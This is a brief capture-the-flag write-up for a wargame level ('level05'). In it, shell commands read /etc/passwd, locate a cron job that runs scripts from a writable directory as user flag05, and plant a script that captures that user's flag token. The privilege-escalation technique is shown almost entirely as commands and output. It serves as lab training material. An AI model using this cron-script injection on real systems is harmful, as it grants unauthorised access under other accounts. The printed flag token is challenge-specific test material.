# level05

```bash
~$ cat /etc/passwd | grep flag05
flag05:x:3005:3005::/home/flag/flag05:/bin/bash

~$ find / -uid 3005 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

~$ find / -type f 2>/dev/null | xargs -i grep 'openarena' \{\} 2>/dev/null \;
(...)
/var/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
(...)

~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

~$ crontab /var/mail/level05
~$ echo '/bin/getflag > /tmp/flag' > /opt/openarenaserver/script
~$ chmod +x /opt/openarenaserver/script
~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
